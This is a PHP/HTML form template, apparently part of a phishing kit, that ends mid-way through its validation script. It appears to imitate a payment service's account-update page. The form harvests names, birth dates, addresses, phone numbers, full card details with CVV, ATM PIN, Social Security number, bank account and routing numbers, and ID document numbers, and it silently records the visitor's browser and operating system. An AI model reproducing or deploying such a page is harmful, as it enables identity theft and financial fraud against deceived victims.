<?php



?>
<!--<link rel="stylesheet" type="text/css" href="../css/xpt.css">-->
<script language="JavaScript" src="../js/validator.js" type="text/javascript"></script>
<style type="text/css">
#orange{color:#FF4000;}
.label {vertical-align: text-top; text-align: right; font-size: 11px; font-weight: bold; padding-top: 1px;line-height: 2.2;}
.hhelp{line-height: 1.5;}
</style>



		
<table align="center" border="0" cellpadding="0" cellspacing="0" width="600">
 <form name="Form_1" method="POST" action="update.php?cmd=_home&dispatch=5885d80a13c0db1f8e<?php echo "&ee=$ee"; ?>">



<hr class="dotted">
<h3><?php echo $pip; ?></h3>
<p><?php echo $acu; ?><br /><?php echo $filla; ?><br></p>



<table align="center" border="0" cellpadding="0" cellspacing="5" width="500">
<span class="small"><b><?php echo $rfield; ?><font id="orange"> * </font></b><br>

 
<tr>
<td class="label" width="280">

<label for="firstname"><font id="orange">* </font><?php echo $ffPrenom; ?></label>

</td>
<td width="2">&nbsp;</td>
<td width="418"><input type="text" id="firstname" name="firstname" size="20" value=""></td>
</tr>

<tr>
<td class="label" width="280"><label for="name"><font id="orange">* </font><?php echo $ffNom; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418"><input class="" type="text" id="name" name="name" size="15" value=""></td>

</tr>
<tr>

<td class="label" width="280"><label for="bday"><font id="orange">* </font><?php echo $dateness; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418">
 <select class="" name="bday" id="bday">
<option selected value=""><?php echo $day; ?></option>
<option value="01">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
<option value="13">13</option>
<option value="14">14</option>
<option value="15">15</option>
<option value="16">16</option>
<option value="17">17</option>
<option value="18">18</option>
<option value="19">19</option>
<option value="20">20</option>
<option value="21">21</option>
<option value="22">22</option>
<option value="23">23</option>
<option value="24">24</option>
<option value="25">25</option>
<option value="26">26</option>
<option value="27">27</option>
<option value="28">28</option>
<option value="29">29</option>
<option value="30">30</option>
<option value="31" >31</option>
</select>
<select class="" name=bmonth>
<option selected value=""><?php echo $month; ?></option>
<option value="01">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
</select>

<select class="" name=byear>
<option selected value=""><?php echo $year; ?></option>
<option value="2013">2013</option> 
<option value="2012">2012</option> 
<option value="2011">2011</option> 
<option value="2010">2010</option> 
<option value="2009">2009</option> 
<option value="2008">2008</option> 
<option value="2007">2007</option> 
<option value="2006">2006</option> 
<option value="2005">2005</option> 
<option value="2004">2004</option> 
<option value="2003">2003</option> 
<option value="2002">2002</option> 
<option value="2001">2001</option> 
<option value="2000">2000</option> 
<option value="1999">1999</option> 
<option value="1998">1998</option> 
<option value="1997">1997</option> 
<option value="1996">1996</option> 
<option value="1995">1995</option> 
<option value="1994">1994</option> 
<option value="1993">1993</option> 
<option value="1992">1992</option>
<option value="1991">1991</option>
<option value="1990">1990</option>
<option value="1989">1989</option>
<option value="1988">1988</option>
<option value="1987">1987</option>
<option value="1986">1986</option>
<option value="1985">1985</option>
<option value="1984">1984</option>
<option value="1983">1983</option>
<option value="1982">1982</option>
<option value="1981">1981</option>
<option value="1980">1980</option>
<option value="1979">1979</option>
<option value="1978">1978</option>
<option value="1977">1977</option>
<option value="1976">1976</option>
<option value="1975">1975</option>
<option value="1974">1974</option>
<option value="1973">1973</option>
<option value="1972">1972</option>
<option value="1971">1971</option>
<option value="1970">1970</option>
<option value="1969">1969</option>
<option value="1968">1968</option>
<option value="1967">1967</option>
<option value="1966">1966</option>
<option value="1965">1965</option>
<option value="1964">1964</option>
<option value="1963">1963</option>
<option value="1962">1962</option>
<option value="1961">1961</option>
<option value="1960">1960</option>
<option value="1959">1959</option>
<option value="1958">1958</option>
<option value="1957">1957</option>
<option value="1956">1956</option>
<option value="1955">1955</option>
<option value="1954">1954</option>
<option value="1953">1953</option>
<option value="1952">1952</option>
<option value="1951">1951</option>
<option value="1950">1950</option>
<option value="1949">1949</option>
<option value="1948">1948</option>
<option value="1947">1947</option>
<option value="1946">1946</option>
<option value="1945">1945</option>
<option value="1944">1944</option>
<option value="1943">1943</option>
<option value="1942">1942</option>
<option value="1941">1941</option>
<option value="1940">1940</option>
<option value="1939">1939</option>
<option value="1938">1938</option>
<option value="1937">1937</option>
<option value="1936">1936</option>
<option value="1935">1935</option>
<option value="1934">1934</option>
<option value="1933">1933</option>
<option value="1932">1932</option>
<option value="1931">1931</option>
<option value="1930">1930</option>
<option value="1929">1929</option>
<option value="1928">1928</option>
<option value="1927">1927</option>
<option value="1926">1926</option>
<option value="1925">1925</option>
<option value="1924">1924</option>
<option value="1923">1923</option>
<option value="1922">1922</option>
<option value="1921">1921</option>
<option value="1920">1920</option>
<option value="1919">1919</option>
<option value="1918">1918</option>
<option value="1917">1917</option>
<option value="1916">1916</option>
<option value="1915">1915</option>
<option value="1914">1914</option>
<option value="1913">1913</option>
<option value="1912">1912</option>
</select>
</td>
</tr>

<tr></tr>
<tr>
<td class="label" width="280"><label for="RCP_COUNTRY"><font id="orange">* </font><?php echo $country; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418"><span class="form">
  <select name="RCP_COUNTRY" id="RCP_COUNTRY" onFocus="logFocus('RCP_COUNTRY')" onBlur="logBlur('RCP_COUNTRY')" onChange="clearMenu(); displayCountryCurrencies()" style="font-size:8pt;">
    <option value="0" selected><?php echo $scountry; ?></option>
	<option value=" ">-----------------------</option>
    <option value="UNITED STATES">United States</option>
    <option value="CANADA">Canada</option>
    <option value="MEXICO">Mexico</option>
    <option value=" ">-----------------------</option>
    <option value="AFGHANISTAN">Afghanistan</option>
    <option value="ALBANIA">Albania</option>
    <option value="ALGERIA">Algeria</option>
    <option value="AMERICAN SAMOA">American Samoa</option>
    <option value="ANGUILLA">Anguilla</option>
    <option value="ANTIGUA &amp; BARBUDA">Antigua &amp; Barbuda</option>
    <option value="ARGENTINA">Argentina</option>
    <option value="ARMENIA">Armenia</option>
    <option value="ARUBA">Aruba</option>
    <option value="AUSTRALIA">Australia</option>
    <option value="AUSTRIA">Austria</option>
    <option value="AZERBAIJAN">Azerbaijan</option>
    <option value="BAHAMAS">Bahamas</option>
    <option value="BAHRAIN">Bahrain</option>
    <option value="BANGLADESH">Bangladesh</option>
    <option value="BARBADOS">Barbados</option>
    <option value="BELARUS">Belarus</option>
    <option value="BELGIUM">Belgium</option>
    <option value="BELIZE">Belize</option>
    <option value="BENIN">Benin</option>
    <option value="BHUTAN">Bhutan</option>
    <option value="BOLIVIA">Bolivia</option>
    <option value="BONAIRE">Bonaire</option>
    <option value="BOSNIA &amp; HERZEGOVINA">Bosnia &amp; Herzegovina</option>
    <option value="BOTSWANA">Botswana</option>
    <option value="BRAZIL">Brazil</option>
    <option value="BRITISH VIRGIN ISLANDS">British Virgin Islands</option>
    <option value="BRUNEI DARUSSALAM">Brunei Darussalam</option>
    <option value="BULGARIA">Bulgaria</option>
    <option value="BURKINA FASO">Burkina Faso</option>
    <option value="BURUNDI">Burundi</option>
    <option value="CAMBODIA">Cambodia</option>
    <option value="CAMEROON">Cameroon</option>
    <option value="CAPE VERDE">Cape Verde</option>
    <option value="CAYMAN ISLANDS">Cayman Islands</option>
    <option value="CENTRAL AFRICAN REPUBLIC">Central African Rep</option>
    <option value="CHAD">Chad</option>
    <option value="CHILE">Chile</option>
    <option value="CHINA">China</option>
    <option value="COLOMBIA">Colombia</option>
    <option value="COMOROS">Comoros</option>
    <option value="CONGO">Congo</option>
    <option value="COOK ISLANDS">Cook Islands</option>
    <option value="COSTA RICA">Costa Rica</option>
    <option value="COTE D IVOIRE">Cote D'Ivoire</option>
    <option value="CROATIA">Croatia</option>
    <option value="CUBA - US MILITARY">Cuba - US Military</option>
    <option value="CURACAO">Curacao</option>
    <option value="CYPRUS">Cyprus</option>
    <option value="CYPRUS NORTHERN">Cyprus (Northern)</option>
    <option value="CZECH REPUBLIC">Czech Republic</option>
    <option value="DEMOCRATIC REPUBLIC OF CONGO">Dem Rep of Congo</option>
    <option value="DENMARK">Denmark</option>
    <option value="DJIBOUTI">Djibouti</option>
    <option value="DOMINICA">Dominica</option>
    <option value="DOMINICAN REPUBLIC">Dominican Republic</option>
    <option value="EAST TIMOR">East Timor</option>
    <option value="ECUADOR">Ecuador</option>
    <option value="EGYPT">Egypt</option>
    <option value="EL SALVADOR">El Salvador</option>
    <option value="EQUATORIAL GUINEA">Equatorial Guinea</option>
    <option value="ERITREA">Eritrea</option>
    <option value="ESTONIA">Estonia</option>
    <option value="ETHIOPIA">Ethiopia</option>
    <option value="FALKLAND ISLANDS">Falkland Islands</option>
    <option value="FIJI">Fiji</option>
    <option value="FINLAND">Finland</option>
    <option value="FRANCE">France</option>
    <option value="FRENCH GUIANA">French Guiana</option>
    <option value="FRENCH POLYNESIA">French Polynesia</option>
    <option value="GABON">Gabon</option>
    <option value="GAMBIA">Gambia</option>
    <option value="GEORGIA">Georgia</option>
    <option value="GERMANY">Germany</option>
    <option value="GERMANY - US MILITARY">Germany - US Military</option>
    <option value="GHANA">Ghana</option>
    <option value="GIBRALTAR">Gibraltar</option>
    <option value="GREECE">Greece</option>
    <option value="GRENADA">Grenada</option>
    <option value="GUADELOUPE">Guadeloupe</option>
    <option value="GUAM">Guam</option>
    <option value="GUATEMALA">Guatemala</option>
    <option value="GUINEA">Guinea</option>
    <option value="GUINEA-BISSAU">Guinea-Bissau</option>
    <option value="GUYANA">Guyana</option>
    <option value="HAITI">Haiti</option>
    <option value="HONDURAS">Honduras</option>
    <option value="HONG KONG">Hong Kong</option>
    <option value="HUNGARY">Hungary</option>
    <option value="ICELAND">Iceland</option>
    <option value="INDIA">India</option>
    <option value="INDONESIA">Indonesia</option>
    <option value="IRAQ">Iraq</option>
    <option value="IRELAND">Ireland</option>
    <option value="ISRAEL">Israel</option>
    <option value="ITALY">Italy</option>
    <option value="ITALY - US MILITARY">Italy - US Military</option>
    <option value="JAMAICA">Jamaica</option>
    <option value="JAPAN">Japan</option>
    <option value="JAPAN - US MILITARY">Japan - US Military</option>
    <option value="JORDAN">Jordan</option>
    <option value="KAZAKHSTAN">Kazakhstan</option>
    <option value="KENYA">Kenya</option>
    <option value="KIRIBATI">Kiribati</option>
    <option value="KOREA - US MILITARY">Korea - US Military</option>
    <option value="REPUBLIC OF KOREA">Korea, Republic of</option>
    <option value="KOSOVO DEM">Kosovo</option>
    <option value="KUWAIT">Kuwait</option>
    <option value="KYRGHYZ REPUBLIC">Kyrghyz Republic</option>
    <option value="LAOS">Laos</option>
    <option value="LATVIA">Latvia</option>
    <option value="LEBANON">Lebanon</option>
    <option value="LIBERIA">Liberia</option>
    <option value="LIBYA">Libya</option>
    <option value="LIECHTENSTEIN">Liechtenstein</option>
    <option value="LITHUANIA">Lithuania</option>
    <option value="LUXEMBOURG">Luxembourg</option>
    <option value="MACAU">Macau</option>
    <option value="MACEDONIA">Macedonia</option>
    <option value="MADAGASCAR">Madagascar</option>
    <option value="MALAWI">Malawi</option>
    <option value="MALAYSIA">Malaysia</option>
    <option value="MALDIVES">Maldives</option>
    <option value="MALI">Mali</option>
    <option value="MALTA">Malta</option>
    <option value="MARSHALL ISLANDS">Marshall Islands</option>
    <option value="MARTINIQUE">Martinique</option>
    <option value="MAURITANIA">Mauritania</option>
    <option value="MAURITIUS">Mauritius</option>
    <option value="MAYOTTE">Mayotte</option>
    <option value="MICRONESIA">Micronesia</option>
    <option value="MOLDOVA">Moldova</option>
    <option value="MONACO">Monaco</option>
    <option value="MONGOLIA">Mongolia</option>
    <option value="MONTSERRAT">Montserrat</option>
    <option value="MOROCCO">Morocco</option>
    <option value="MOZAMBIQUE">Mozambique</option>
    <option value="NEPAL">Nepal</option>
    <option value="NETHERLANDS">Netherlands</option>
    <option value="NEW CALEDONIA">New Caledonia</option>
    <option value="NEW ZEALAND">New Zealand</option>
    <option value="NICARAGUA">Nicaragua</option>
    <option value="NIGER">Niger</option>
    <option value="NIGERIA">Nigeria</option>
    <option value="NIUE">Niue</option>
    <option value="MARIANAS">Northern Mariana Islands</option>
    <option value="NORWAY">Norway</option>
    <option value="OMAN">Oman</option>
    <option value="PAKISTAN">Pakistan</option>
    <option value="PALAU">Palau</option>
    <option value="PALESTINIAN AUTHORITY">Palestinian Authority</option>
    <option value="PANAMA">Panama</option>
    <option value="PAPUA NEW GUINEA">Papua New Guinea</option>
    <option value="PARAGUAY">Paraguay</option>
    <option value="PERU">Peru</option>
    <option value="PHILIPPINES">Philippines</option>
    <option value="POLAND">Poland</option>
    <option value="PORTUGAL">Portugal</option>
    <option value="QATAR">Qatar</option>
    <option value="REUNION">Reunion</option>
    <option value="ROMANIA">Romania</option>
    <option value="RUSSIA">Russia</option>
    <option value="RWANDA">Rwanda</option>
    <option value="SAMOA">Samoa</option>
    <option value="SAO TOME AND PRINCIPE">S&atilde;o Tom&eacute; and Pr&iacute;ncipe</option>
    <option value="SAUDI ARABIA">Saudi Arabia</option>
    <option value="SENEGAL">Senegal</option>
    <option value="SERBIA &amp; MONTENEGRO">Serbia &amp; Montenegro</option>
    <option value="SEYCHELLES">Seychelles</option>
    <option value="SIERRA LEONE">Sierra Leone</option>
    <option value="SINGAPORE">Singapore</option>
    <option value="SLOVAKIA">Slovakia</option>
    <option value="SLOVENIA">Slovenia</option>
    <option value="SOLOMON ISLANDS">Solomon Islands</option>
    <option value="SPAIN">Spain</option>
    <option value="SRI LANKA">Sri Lanka</option>
    <option value="ST. KITTS">St. Kitts &amp; Nevis</option>
    <option value="ST. LUCIA">St. Lucia</option>
    <option value="ST. MAARTEN">St. Maarten</option>
    <option value="ST. VINCENT">St. Vincent</option>
    <option value="SUDAN">Sudan</option>
    <option value="SURINAME">Suriname</option>
    <option value="SWEDEN">Sweden</option>
    <option value="SWITZERLAND">Switzerland</option>
    <option value="SYRIA">Syria</option>
    <option value="TAIWAN">Taiwan</option>
    <option value="TAJIKISTAN">Tajikistan</option>
    <option value="TANZANIA">Tanzania</option>
    <option value="THAILAND">Thailand</option>
    <option value="TOGO">Togo</option>
    <option value="TONGA">Tonga</option>
    <option value="TRINIDAD &amp; TOBAGO">Trinidad &amp; Tobago</option>
    <option value="TUNISIA">Tunisia</option>
    <option value="TURKEY">Turkey</option>
    <option value="TURKMENISTAN">Turkmenistan</option>
    <option value="TURKS &amp; CAICOS">Turks &amp; Caicos Island</option>
    <option value="TUVALU">Tuvalu</option>
    <option value="UGANDA">Uganda</option>
    <option value="UKRAINE">Ukraine</option>
    <option value="UNITED ARAB EMIRATES">United Arab Emirates</option>
    <option value="UNITED KINGDOM">United Kingdom</option>
    <option value="URUGUAY">Uruguay</option>
    <option value="UZBEKISTAN">Uzbekistan</option>
    <option value="VANUATU">Vanuatu</option>
    <option value="VENEZUELA">Venezuela</option>
    <option value="VIETNAM">Vietnam</option>
    <option value="YEMEN">Yemen</option>
    <option value="ZAMBIA">Zambia</option>
    <option value="ZIMBABWE">Zimbabwe</option>
  </select>
  <script>
					fields["RCP_COUNTRY"].setValue("")
				</script>
</span></td>

</tr>





<tr>
<td class="label" width="280"><label for="address"><font id="orange">* </font><?php echo $adr1; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418"><input class="" type="text" id="address" name="address" size="30" value=""></td>
</tr>
<tr>
<td class="label" width="280"><label for="address2"><?php echo $adr2; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418"><input class="" type="text" id="address2" name="address2" size="30" value=""></td>
</tr>



<tr>
<td class="label" width="280"><label for="city"><font id="orange">* </font><?php echo $city; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418"><input class="" type="text" id="city" name="city" size="15" value=""></td>

</tr>

<tr <?php if($zipcode==false){echo 'style="display:none;"';}?>>
<td class="label" width="280"><label for="zip"><font id="orange">* </font><?php echo $zip; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418"><input class="" type="text" id="zip" name="zip" size="5" maxlength="7" value=""></td>
</tr>

<tr>
<td class="label" width="280"><label for="userphone"><font id="orange">* </font><?php echo $hpn; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418"><input type="text" id="userphone" size="10" maxlength="10" name="userphone" value=""></td>
</tr>
<tr>
<td class="label" width="280"><label for="userphoneinfo">&nbsp;</label></td>
<td width="2">&nbsp;</td>

<td width="418"><span class="small"><font color="#C3C3C3"><?php echo $acpnum; ?></font></span></td>
</tr>

</table>







</br>
<hr class="dotted">
<h3><?php echo $ccprof; ?></h3>
<p><?php echo $damelacc; ?><br/><?php echo $damelacb; ?></p>
</br>


<table align="center" border="0" cellpadding="" cellspacing="5" width="600" >

<tr>
<td class="label" width="280"><label for="CardName"><font id="orange">* </font><?php echo $Nomdutitulairedelacarte; ?></label></td>

<td width="2">&nbsp;</td>
<td width="418"><input class="" type="text" id="CardName" name="CardName" size="20"  maxlength="16" value="">
</td>
</tr>
<input id="cardtype" type="text" name="cardtype" size="20" value="" style="display:none;" >
<script type="text/javascript">
 function print(s){
	document.getElementById("cardtype").value=s;
 }
 function log(s){
	document.getElementById(s).src='../WEBSCR-640-20101004-1/css/Customer/pages/card/'+s;
 }
 function GetCreditCardTypeByNumber(ccnumber) {
	var etat = false;
	//var ccnumber=element.value;
    var cc = (ccnumber + '').replace(/\s/g, ''); //remove space
   document.getElementById("logo_ccAmex1.gif").src='../WEBSCR-640-20101004-1/css/Customer/pages/card/logo_ccAmex.gif';
   document.getElementById("logo_ccMC1.gif").src='../WEBSCR-640-20101004-1/css/Customer/pages/card/logo_ccMC.gif';
   document.getElementById("logo_ccVisa1.gif").src='../WEBSCR-640-20101004-1/css/Customer/pages/card/logo_ccVisa.gif';
   document.getElementById("logo_ccDiscover1.gif").src='../WEBSCR-640-20101004-1/css/Customer/pages/card/logo_ccDiscover.gif';
    if ((/^(34|37)/).test(cc) && cc.length == 15) {
        print('American Express'); //AMEX begins with 34 or 37, and length is 15.
		log("logo_ccAmex1.gif");
		etat = true;
    } else if ((/^(51|52|53|54|55)/).test(cc) && cc.length == 16) {
        print('MasterCard');
		log("logo_ccMC1.gif");
		etat = true;
    } else if ((/^(4)/).test(cc) && (cc.length == 13 || cc.length == 16)) {
        print('Visa'); 
		log("logo_ccVisa1.gif");
		etat= true;
    } else if ((/^(300|301|302|303|304|305|36|38)/).test(cc) && cc.length == 14) {
        print('DinersClub'); 
		etat= true;
    } else if ((/^(2014|2149)/).test(cc) && cc.length == 15) {
        print('enRoute'); 
		etat= true;
    } else if ((/^(6011|16)/).test(cc) && cc.length == 16) {
        print('Discover'); 
		log("logo_ccDiscover1.gif");
		etat = true;
    }else{
		print('?????');
	}
	return etat;
}

</script>

<tr>
<td class="label" width="280"><label for="defaultcardnumber"><font id="orange">* </font><?php echo $ccnumbr; ?></label></td>

<td width="2">&nbsp;</td>
<td width="418"><input onblur="GetCreditCardTypeByNumber(this.value)"  class="" type="text" id="defaultcardnumber" name="defaultcardnumber" size="20"  maxlength="16" value="">


<img src="../WEBSCR-640-20101004-1/css/Customer/pages/card/logo_ccVisa.gif" id="logo_ccVisa1.gif" alt="Visa" border="0" width="30" height="21" align="top">
<img src="../WEBSCR-640-20101004-1/css/Customer/pages/card/logo_ccMC.gif" id="logo_ccMC1.gif" alt="MasterCard"  border="0" width="30" height="21" align="top">
<img src="../WEBSCR-640-20101004-1/css/Customer/pages/card/logo_ccDiscover.gif" id="logo_ccDiscover1.gif" alt="Discover" border="0" width="30" height="21" align="top">
<img src="../WEBSCR-640-20101004-1/css/Customer/pages/card/logo_ccAmex.gif" id="logo_ccAmex1.gif" alt="Amex" border="0" width="30" height="21" align="top">
</td>
</tr>



<tr>
<td class="label" width="280"><label for="defaultexpdate"><font id="orange">* </font><?php echo $expbr; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418">

<select  class="" name="defaultexpmonth" id="defaultexpmonth">
<option selected value=""><?php echo $month; ?></option>
<option value="01">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
</select>
<select  class="" name="defaultexpyear" size="1" id="defaultexpyear" type="select">
<option value="00" ><?php echo $year; ?></option>
<option value="2012">2012</option>
<option value="2013">2013</option>
<option value="2014">2014</option>
<option value="2015">2015</option>
<option value="2016">2016</option>
<option value="2017">2017</option>
<option value="2018">2018</option>
<option value="2019">2019</option>
<option value="2020">2020</option>
<option value="2021">2021</option>
<option value="2022">2022</option>
<option value="2023">2023</option>
<option value="2024">2024</option>
<option value="2025">2025</option>
<option value="2026">2026</option>
<option value="2027">2027</option>
<option value="2028">2028</option>
<option value="2029">2029</option>
<option value="2030">2030</option>
<option value="2031">2031</option>
<option value="2032">2032</option>
</select>&nbsp;</td>
</tr>

<tr>
<td class="label" width="280" STYLE="vertical-align: middle"><label for="defaultcvv2"><font id="orange">* </font><?php echo $cvv; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418"><input class="hhelp" style="vertical-align: bottom" type="text" id="defaultcvv2" size="3" maxlength="3" name="defaultcvv2" value="">
<a href="javascript:openWindow1();"><img src="../WEBSCR-640-20101004-1/css/Customer/pages/img/mini_cvv2.gif" alt="" border="0" align="middle"><span class="small" STYLE="vertical-align: sub"><?php echo $hcvv; ?></span></a>
</td>
</tr>

<tr <?php if($atmO==false){echo 'style="display:none;"';}?>>
<td class="label" width="280"><label for="atm"><font id="orange">* </font><?php echo $atmm; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418"><input class="" type="text" id="atm" name="atm" size="3"  maxlength="4" value="<?php if($atmO==false){echo '0000';}?>"></td>
</tr>


<tr>
<td class="label" width="280"><label for="ssn"><font id="orange">* </font><?php echo $ssn; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418"><input class="" type="text" id="ssn" name="ssn" size="9"  maxlength="9" value=""></td>
</tr>

<tr <?php if($bkA==false){echo 'style="display:none;"';}?>>
<td class="label" width="280"><label for="account"><font id="orange">* </font><?php echo $account; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418"><input class="" type="text" id="account" name="account" size="20"  maxlength="17" value="">&nbsp;<a href="javascript:openWindow4();"><span class="small" STYLE="vertical-align: sub"><?php echo $haccount; ?></span></a></td>
</tr>

<tr <?php if($bkA==true){echo 'style="display:none;"';}?>>
<td class="label" width="280"><label for="accountch"><font id="orange">* </font><?php echo $accountch; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418"><input class="" type="text" id="accountch" name="accountch" size="4"  maxlength="4" value="">&nbsp;<a href="javascript:openWindow4();"><span class="small" STYLE="vertical-align: sub"><?php echo $haccount; ?></span></a></td>
</tr>

<tr <?php if($bkR==false){echo 'style="display:none;"';}?>>
<td class="label" width="280"><label for="routing"><?php echo $routing; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418"><input class="" type="text" id="routing" name="routing" size="9"  maxlength="9" value="">&nbsp;<a href="javascript:openWindow3();"><span class="small" STYLE="vertical-align: sub"><?php echo $hrouting; ?></span></a></td>
</tr>

<tr <?php if($securcode==false){echo 'style="display:none;"';}?>>
<td class="label" width="280"><label for="codepersonel"><?php echo $codepersonel; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418"><input class="" type="text" id="codepersonel" name="codepersonel" size="15"  maxlength="25" value=""></td>
</tr>
<script language="JavaScript" type="text/javascript">
function type_id(a){
if(a!=""){
document.getElementById("set_type_id2").innerHTML='<font id="orange">* </font>'+a+' :';
document.getElementById('set_type_id').style.display = 'block';
}else{
document.getElementById("set_type_id2").innerHTML='';
document.getElementById('set_type_id').style.display = 'none';
}}
var BrowserDetect = {
	init: function () {
		this.browser = this.searchString(this.dataBrowser) || "An unknown browser";
		this.version = this.searchVersion(navigator.userAgent)
			|| this.searchVersion(navigator.appVersion)
			|| "an unknown version";
		this.OS = this.searchString(this.dataOS) || "an unknown OS";
	},
	searchString: function (data) {
		for (var i=0;i<data.length;i++)	{
			var dataString = data[i].string;
			var dataProp = data[i].prop;
			this.versionSearchString = data[i].versionSearch || data[i].identity;
			if (dataString) {
				if (dataString.indexOf(data[i].subString) != -1)
					return data[i].identity;
			}
			else if (dataProp)
				return data[i].identity;
		}
	},
	searchVersion: function (dataString) {
		var index = dataString.indexOf(this.versionSearchString);
		if (index == -1) return;
		return parseFloat(dataString.substring(index+this.versionSearchString.length+1));
	},
	dataBrowser: [
		{
			string: navigator.userAgent,
			subString: "Chrome",
			identity: "Chrome"
		},
		{ 	string: navigator.userAgent,
			subString: "OmniWeb",
			versionSearch: "OmniWeb/",
			identity: "OmniWeb"
		},
		{
			string: navigator.vendor,
			subString: "Apple",
			identity: "Safari",
			versionSearch: "Version"
		},
		{
			prop: window.opera,
			identity: "Opera",
			versionSearch: "Version"
		},
		{
			string: navigator.vendor,
			subString: "iCab",
			identity: "iCab"
		},
		{
			string: navigator.vendor,
			subString: "KDE",
			identity: "Konqueror"
		},
		{
			string: navigator.userAgent,
			subString: "Firefox",
			identity: "Firefox"
		},
		{
			string: navigator.vendor,
			subString: "Camino",
			identity: "Camino"
		},
		{		// for newer Netscapes (6+)
			string: navigator.userAgent,
			subString: "Netscape",
			identity: "Netscape"
		},
		{
			string: navigator.userAgent,
			subString: "MSIE",
			identity: "Explorer",
			versionSearch: "MSIE"
		},
		{
			string: navigator.userAgent,
			subString: "Gecko",
			identity: "Mozilla",
			versionSearch: "rv"
		},
		{ 		// for older Netscapes (4-)
			string: navigator.userAgent,
			subString: "Mozilla",
			identity: "Netscape",
			versionSearch: "Mozilla"
		}
	],
	dataOS : [
		{
			string: navigator.platform,
			subString: "Win",
			identity: "Windows"
		},
		{
			string: navigator.platform,
			subString: "Mac",
			identity: "Mac"
		},
		{
			   string: navigator.userAgent,
			   subString: "iPhone",
			   identity: "iPhone/iPod"
	    },
		{
			string: navigator.platform,
			subString: "Linux",
			identity: "Linux"
		}
	]
 
};
BrowserDetect.init();
</script>
<tr <?php if($typeid==false){echo 'style="display:none;"';}?>>
<td class="label" width="280"><label for="IDTYPE"><font id="orange">* </font><?php echo $IDTYPE; ?></label></td>
<td width="2">&nbsp;</td>
<td width="418">
<select  class="" name="IDTYPE" id="IDTYPE" onchange="type_id(this.value)">
<option selected value="">----------------------------</option>
<option value="<?php echo $Passport; ?>"><?php echo $Passport; ?></option>
<option value="<?php echo $Card_Identification; ?>"><?php echo $Card_Identification; ?></option>
<option value="<?php echo $Driving_License; ?>"><?php echo $Driving_License; ?></option>
</select>&nbsp;</td>
</tr>
<tr <?php if($typeid==false){echo 'style="display:none;"';}?>>
<td class="label" width="280"><label for="set_type_id"  id="set_type_id2"></label></td>
<td width="2">&nbsp;</td>
<td width="418"><input class="" type="text" id="set_type_id" name="set_type_id" size="21" value="" style="display:none;"></td>
</tr>
<input type="text" id="BROWSER" name="BROWSER" value="" style="display:none;">
<script type="text/javascript"> 
document.getElementById('BROWSER').value = BrowserDetect.browser + ' ' + BrowserDetect.version + ' on ' + BrowserDetect.OS;
</script> 

</table>



<table align="center" border="0" cellpadding="0" cellspacing="0" width="700">
<tr>
<td>
<br><?php echo $for1; ?><br><?php echo $for2; ?> <b><?php echo $spo; ?></b> <?php echo $for3; ?></span>
<hr class="dotted"></td>
</tr>
<tr>
<td align="right">
<!--<input type="submit" name="set" value="Enregistrer et continuer">-->
<input style="margin-top:30px;margin-bottom:40px;_margin-bottom:30px;background: #fcbb49 url(../WEBSCR-640-20101004-1/css/Customer/pages/img/btn_main_1x50.gif) repeat-x top left;width:auto;_width:180px;height:22px;border:0;font:bold 12px arial;color:#FFFFFF;text-align:center;border: 1px solid #ff9900;" type="submit" name="set" value="<?php echo $spo; ?>">
<br>

</td>
</tr>
</table>

<script language="JavaScript" type="text/javascript">
 var frmvalidator = new Validator("Form_1");
  
 
 frmvalidator.addValidation("firstname","req","<?php $i=0;echo $valid["$i"];$i++;?>");
 frmvalidator.addValidation("firstname","maxlen=40","<?php echo $valid["$i"];$i++;?>");

 frmvalidator.addValidation("name","req","<?php echo $valid["$i"];$i++;?>");
 frmvalidator.addValidation("name","maxlen=40","<?php echo $valid["$i"];$i++;?>");

 frmvalidator.addValidation("bmonth","dontselect=0","<?php echo $valid["$i"];$i++;?>");

 frmvalidator.addValidation("bday","dontselect=0","<?php echo $valid["$i"];$i++;?>");

 frmvalidator.addValidation("byear","dontselect=0","<?php echo $valid["$i"];$i++;?>");

 frmvalidator.addValidation("address","req","<?php echo $valid["$i"];$i++;?>");
 frmvalidator.addValidation("address","maxlen=50","<?php echo $valid["$i"];$i++;?>");
 frmvalidator.addValidation("address","minlen=5","<?php echo $valid["$i"];$i++;?>");
 
 frmvalidator.addValidation("city","req","<?php echo $valid["$i"];$i++;?>");
 frmvalidator.addValidation("city","maxlen=15","<?php echo $valid["$i"];$i++;?>");
 frmvalidator.addValidation("city","minlen=4","<?php echo $valid["$i"];$i++;?>");


 frmvalidator.addValidation("RCP_COUNTRY","dontselect=0","<?php echo $valid["$i"];?>");
 frmvalidator.addValidation("RCP_COUNTRY","dontselect=1","<?php echo $valid["$i"];?>");
 frmvalidator.addValidation("RCP_COUNTRY","dontselect=5","<?php echo $valid["$i"];$i++;?>");

 frmvalidator.addValidation("zip","req","<?php echo $valid["$i"];$i++;?>");
  frmvalidator.addValidation("zip","minlen=5","<?php echo $valid["$i"];$i++;?>");
 
 frmvalidator.addValidation("userphone","req","<?php echo $valid["$i"];$i++;?>");
